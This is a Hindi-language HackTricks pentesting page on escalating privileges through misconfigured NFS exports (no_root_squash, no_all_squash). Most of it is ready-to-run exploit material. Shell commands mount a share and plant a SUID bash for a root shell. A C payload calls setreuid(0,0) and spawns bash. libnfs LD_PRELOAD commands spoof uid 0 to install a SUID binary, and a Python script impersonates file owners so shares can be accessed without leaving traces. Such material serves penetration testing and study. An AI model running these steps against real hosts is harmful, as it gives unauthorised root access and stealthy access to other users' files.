<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का पालन करें.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>


_ **/etc/exports** _ फाइल पढ़ें, यदि आपको कोई डायरेक्टरी मिलती है जो **no\_root\_squash** के रूप में कॉन्फ़िगर की गई है, तो आप उसे **क्लाइंट के रूप में एक्सेस** कर सकते हैं और उस डायरेक्टरी में **लिख सकते हैं** जैसे कि आप उस मशीन के स्थानीय **रूट** हों।

**no\_root\_squash**: यह विकल्प मूल रूप से क्लाइंट पर रूट यूजर को NFS सर्वर पर फाइलों तक रूट के रूप में पहुंचने का अधिकार देता है। और यह गंभीर सुरक्षा निहितार्थों की ओर ले जा सकता है।

**no\_all\_squash:** यह **no\_root\_squash** विकल्प के समान है लेकिन **गैर-रूट यूजर्स** पर लागू होता है। कल्पना कीजिए, आपके पास nobody यूजर के रूप में एक शेल है; /etc/exports फाइल की जांच की; no\_all\_squash विकल्प मौजूद है; /etc/passwd फाइल की जांच करें; एक गैर-रूट यूजर का अनुकरण करें; उस यूजर के रूप में एक suid फाइल बनाएं (nfs का उपयोग करके माउंट करके)। nobody यूजर के रूप में suid को निष्पादित करें और अलग यूजर बनें।

# विशेषाधिकार वृद्धि

## रिमोट एक्सप्लॉइट

यदि आपने यह कमजोरी पाई है, तो आप इसका शोषण कर सकते हैं:

* **उस डायरेक्टरी को माउंट करना** क्लाइंट मशीन में, और **रूट के रूप में कॉपी करना** माउंटेड फोल्डर के अंदर **/bin/bash** बाइनरी और उसे **SUID** अधिकार देना, और **पीड़ित** मशीन से उस बाश बाइनरी को निष्पादित करना।
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **उस डायरेक्टरी को माउंट करना** क्लाइंट मशीन में, और **रूट के रूप में कॉपी करना** माउंटेड फोल्डर के अंदर हमारा कंपाइल किया हुआ पेलोड जो SUID अनुमति का दुरुपयोग करेगा, उसे **SUID** अधिकार देना, और **पीड़ित** मशीन से उस बाइनरी को निष्पादित करना (आप यहाँ कुछ [C SUID पेलोड्स](payloads-to-execute.md#c) पा सकते हैं)।
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## स्थानीय एक्सप्लॉइट

{% hint style="info" %}
ध्यान दें कि यदि आप अपनी मशीन से पीड़ित मशीन तक एक **टनल बना सकते हैं तो आप इस विशेषाधिकार एस्केलेशन को दूरस्थ रूप से उपयोग करने के लिए आवश्यक पोर्ट्स को टनलिंग करके रिमोट वर्जन का उपयोग कर सकते हैं**।\
निम्नलिखित चाल तब है जब फाइल `/etc/exports` **एक IP संकेत करता है**। इस मामले में आप **किसी भी मामले में दूरस्थ एक्सप्लॉइट का उपयोग नहीं कर पाएंगे** और आपको इस चाल का **दुरुपयोग करना होगा**।\
एक्सप्लॉइट काम करने के लिए एक और आवश्यक शर्त यह है कि `/etc/export` के अंदर **निर्यात को `insecure` फ्लैग का उपयोग करना चाहिए**।\
\--_मुझे यकीन नहीं है कि अगर `/etc/export` एक IP पते का संकेत कर रहा है तो यह चाल काम करेगी_--
{% endhint %}

## मूल जानकारी

परिदृश्य में स्थानीय मशीन पर माउंट किए गए NFS शेयर का शोषण शामिल है, NFSv3 विनिर्देश में एक दोष का लाभ उठाते हुए जो क्लाइंट को अपना uid/gid निर्दिष्ट करने की अनुमति देता है, संभावित रूप से अनधिकृत पहुंच को सक्षम करता है। शोषण में [libnfs](https://github.com/sahlberg/libnfs) का उपयोग शामिल है, एक पुस्तकालय जो NFS RPC कॉल्स की जालसाजी की अनुमति देता है।

### पुस्तकालय का संकलन

पुस्तकालय संकलन चरणों में कर्नेल संस्करण के आधार पर समायोजन की आवश्यकता हो सकती है। इस विशेष मामले में, fallocate सिस्टम कॉल्स को टिप्पणी किया गया था। संकलन प्रक्रिया निम्नलिखित आदेशों को शामिल करती है:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### एक्सप्लॉइट को अंजाम देना

एक्सप्लॉइट में एक सरल C प्रोग्राम (`pwn.c`) बनाना शामिल है जो रूट विशेषाधिकारों को बढ़ाता है और फिर एक शेल को निष्पादित करता है। प्रोग्राम को संकलित किया जाता है, और परिणामी बाइनरी (`a.out`) को suid रूट के साथ शेयर पर रखा जाता है, `ld_nfs.so` का उपयोग करके RPC कॉल्स में uid को नकली बनाने के लिए:

1. **एक्सप्लॉइट कोड को संकलित करें:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **एक्सप्लॉइट को शेयर पर रखें और uid को नकली बनाकर इसकी अनुमतियां बदलें:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **रूट विशेषाधिकार प्राप्त करने के लिए एक्सप्लॉइट को निष्पादित करें:**
```bash
/mnt/share/a.out
#root
```

## बोनस: चुपके से फाइल एक्सेस के लिए NFShell
एक बार रूट एक्सेस प्राप्त हो जाने के बाद, बिना मालिकाना हक बदले (निशान छोड़ने से बचने के लिए) NFS शेयर के साथ इंटरैक्ट करने के लिए एक Python स्क्रिप्ट (nfsh.py) का उपयोग किया जाता है। यह स्क्रिप्ट uid को उस फाइल के अनुरूप समायोजित करती है जिसे एक्सेस किया जा रहा है, जिससे शेयर पर फाइलों के साथ बिना अनुमति समस्याओं के इंटरैक्शन की अनुमति मिलती है:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
इस तरह चलाएं:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
# संदर्भ
* https://www.errno.fr/nfs_privesc.html


<details>

<summary><strong> AWS हैकिंग सीखें शून्य से लेकर हीरो तक </strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह में शामिल हों**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
